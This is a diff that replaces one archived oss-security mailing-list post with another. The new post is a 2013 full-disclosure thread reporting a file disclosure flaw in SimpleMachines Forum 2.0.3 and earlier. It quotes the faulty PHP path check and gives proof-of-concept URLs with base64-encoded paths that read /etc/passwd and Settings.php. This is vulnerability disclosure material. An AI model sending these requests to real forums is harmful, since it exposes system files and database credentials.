@@ -1,35 +1,81 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/09/14
-Message-ID: <BLU0-SMTP575C59610944DB24212E05EF3F0@phx.gbl>
-Date: Tue, 10 Sep 2013 03:24:41 +0430
-From: Hamid Zamani <me@...idx9.ir>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE Request : NAS v1.9.3 multiple Vulnerabilites
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/08/9
+Message-ID: <CACHAsReXQh2_42n-PVvzB2isbkCBCoEoA=Nurh9XaddJOwsV+w@mail.gmail.com>
+Date: Tue, 8 Jan 2013 10:36:23 -0300
+From: WHK Yan <yan.uniko.102@...il.com>
+To: Carlos Alberto Lopez Perez <clopez@...lia.com>
+Cc: full-disclosure@...ts.grok.org.uk, submissions@...ketstormsecurity.com,  mr.inj3ct0r@...il.com, submit@...ecurity.com, vuln@...unia.com,  vuldb@...urityfocus.com, oss-security@...ts.openwall.com
+Subject: Re: [Full-disclosure] File Disclosure in SimpleMachines Forum <= 2.0.3
 Content-Type: text/plain; charset=utf-8
 
-On 09/10/2013 01:18 AM, Florian Weimer wrote:
-> * Kurt Seifried:
-> 
->> Format String please use CVE-2013-4258
-> 
-> This was actually fixed in r285, before the report:
-> 
-> http://sourceforge.net/mailarchive/forum.php?thread_name=E1Rp1rP-00038Z-VJ%40sfp-svn-6.v30.ch3.sourceforge.com&forum_name=nas-commits
-> 
-> In case someone else is wondering why there hasn't been a recent
-> commit fixing a format string issue. :-)
-> 
-> 
+The flaw is not exploitable without privileges. On some occasions there are
+forums where there are co-admistrators which have privileges to view the
+error log but not to modify code or at least read the mysql connection.
 
-That's right , but as i checked it had been fixed on upstream but
-packages on distros like Debian, Ubuntu and ... not. So i just reported
-that in order to update packages.
+Not have CVE-ID.
 
-Of course i had to mentioned that as it discussed at radscan mail list.
+2013/1/8 Carlos Alberto Lopez Perez <clopez@...lia.com>
 
-Thanks
+> On 07/01/13 15:54, WHK Yan wrote:
+> > *Summary:*
+> > --------------
+> > A security flaw allows an attacker to know the full source file of the
+> web
+> > system.
+> >
+> > *Details:
+> > -----------
+> > Sources/ManageErrors.php Line 340:
+> > // Make sure the file we are looking for is one they are allowed to look
+> at
+> > if (!is_readable($file) || (strpos($file, '../') !== false && (
+> > strpos($file, $boarddir) === false || strpos($file, $sourcedir) ===
+> false)))
+> >     fatal_lang_error('error_bad_file', true,
+> > array(htmlspecialchars($file)));
+> >
+> > Bypass function strpos($file, '../'), no need "../", example:
+> > /home/foo/www/Settings.php
+> >
+> > *PoC:
+> > -------
+> >
+> http://test.con/forum/index.php?action=admin;area=logs;sa=errorlog;file=L2V0Yy9wYXNzd2Q=
+> > Read /etc/passwd
+> >
+> > works with path disclosure for read Settings.php:
+> > http://whk.drawcoders.net/index.php/topic,2792.0.html
+> >
+> > *Reproduce:
+> > 1. Open http://example.com/forumpath/SSI.php?ssi_function=fetchPosts
+> > 2. Get full path of web app ( /home/1337/public_html/SSI.php ).
+> > 3. Exploit in base64:
+> >
+> http://test.con/forum/index.php?action=admin;area=logs;sa=errorlog;file=L2hvbWUvc3BhZG1pbi9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHA=
+> > To read /home/spadmin/public_html/Settings.php
+> >
+> > Referer and Mirror:
+> > -------------------------
+> > http://whk.drawcoders.net/index.php/topic,2805.0.html
+> >
+> >
+> >
+> >
+> > _______________________________________________
+> > Full-Disclosure - We believe in it.
+> > Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+> > Hosted and sponsored by Secunia - http://secunia.com/
+>
+> Hi!
+>
+>
+> I have verified SMF is affected by this issue.
+>
+> The PoC requires an admin login to be exploited. Is there any
+> possibility to exploit this issue without an admin login?
+>
+>
+> I guess a CVE should be assigned. Do you already asked for one?
+>
+>
 
--- 
-Regards,
-Hamid Zamani (aka HAMIDx9)
-Ashiyane Digital Security Team
